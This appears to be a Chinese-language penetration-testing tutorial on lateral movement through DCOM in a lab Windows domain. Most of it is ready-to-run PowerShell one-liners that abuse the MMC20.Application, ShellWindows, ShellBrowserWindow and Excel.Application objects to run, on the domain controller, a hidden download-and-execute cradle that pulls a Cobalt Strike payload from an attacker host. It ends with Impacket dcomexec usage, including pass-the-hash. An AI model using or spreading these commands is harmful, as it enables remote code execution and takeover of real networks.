# 利用DCOM远程命令执行横向移动

### DCOM介绍

- DCOM(分布式组件对象模型)是微软的一系列概念和程序接口。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求，使用DCOM进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管COM服务器端的软件

### 原理介绍

​	通过PowerShell与DCOM进行远程交互。我们只需要提供一个DCOM ProgID和一个IP地址，然后，它就从远程返回一个COM对象的实例。这样我们就可以调用"ExecuteShellCommand"发方法来在远程主机上启动某个进程。

```
//其中一个能查到即可
powershell Get-CimInstance Win32_DCOMApplication
powershell Get-CimInstance -classWin32_DCOMApplication | select appid,name
powershell Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
```

### DCOM横向前提

```
1.需要关闭系统防火墙
2.必须拥有管理员权限
3.在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户
```

### 实验过程

| 机器位置 | IP              | 机器名称        | 登录用户           | 所属域   |
| -------- | --------------- | --------------- | ------------------ | -------- |
| 域控     | 192.168.211.10  | WIN-E0TAL57RCAA | HECK\administrator | heck.com |
| 域内机   | 192.168.211.201 | PC-2016         | HECK\zz            | heck.com |
| 攻击机 | 192.168.211.144 | /        | /                  | / |

### 1.MMC20.Application远程命令执行

- 首先得远控一台域内机器PC-2016，且拥有域管administrator权限或本地管理员权限。

  ![image-20240703131159165](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240703131159165.png)

- 使用CS构造powershell的pyload。

  ![image-20240703131413284](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240703131413284.png)

  ![image-20240703131514893](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240703131514893.png)

- 把生成的payload加入到命令中去即可上线域控。

```
//域管administrator权限或本地管理员权限
powershell [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.211.10")).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.211.144:80/zz'))","Minimzed")
```

![image-20240703130935969](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240703130935969.png)

### 2.ShellWindows远程命令执行

- 步骤同上个组件一致，只是使用的组件不同。该组件的命令如下：

```
powershell [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.211.10")).item().Document.Application.ShellExecute("cmd.exe","/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.211.144:80/zz'))","c:windowssystem32",$null,0)
```

  

### 3.ShellBrowserWindow远程命令执行

​	适用于Windows 10和Windows Server 2012 R2等版本的系统。

- 步骤同上个组件一致，只是使用的组件不同。该组件的命令如下：

```
powershell [activator]::CreateInstance([Type]::GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880","192.168.211.10")).Document.Application.ShellExecute("cmd.exe","/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.211.144/zz'))","c:windowssystem32",$null,0)
```

### 4.Excel.Application远程命令执行

```
$com =
[activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.211.10")).DisplayAlerts =$false
$com=[activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.211.10")).DDEInitiate("cmd.exe","/c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.211.144:80/zz'))")
```

### 5.Impacket中的dcomexec.py

```
dcomexec.exe [domain/]username:password@ip 				//创建一个交互shell
dcomexec.exe [domain/]username:password@ip [命令] 		//执行命令
dcomexec.exe [domain/]username:@ip -hashes [hash]		//hash传递
```

